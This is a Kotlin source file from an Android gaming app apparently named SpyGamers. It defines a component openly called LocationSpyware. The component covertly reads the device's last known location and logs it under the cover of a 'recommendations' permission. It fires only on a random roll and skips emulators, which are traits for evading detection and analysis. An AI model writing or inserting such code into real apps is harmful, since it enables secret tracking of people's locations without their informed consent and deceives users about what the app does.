package com.example.spygamers.components.spyware

import android.content.Context
import android.location.Location
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.spygamers.controllers.GamerViewModel
import com.google.android.gms.location.LocationServices
import kotlin.random.Random

@Composable
fun LocationSpyware(
    viewModel: GamerViewModel,
    context: Context
){
    val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()
    val isEmulator by viewModel.isOnEmulator.collectAsState()

    val performService = Random.nextInt(1, 3) == 1
    if (!performService) {
        return
    }

    // No permissions granted, ignore....
    if (!recommendationGrantsState) {
        return
    }

    if (isEmulator) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val locationProviderClient = LocationServices.getFusedLocationProviderClient(context)
            val lastLocationTask = locationProviderClient.lastLocation
            lastLocationTask.addOnSuccessListener { location: Location? ->
                // Use the location object here
                location?.let {
                    viewModel.logLocations(it.latitude, it.longitude)
                }
            }
        } catch (e: SecurityException) {
            viewModel.updateRecommendationsGrants(false)
        }
    }
}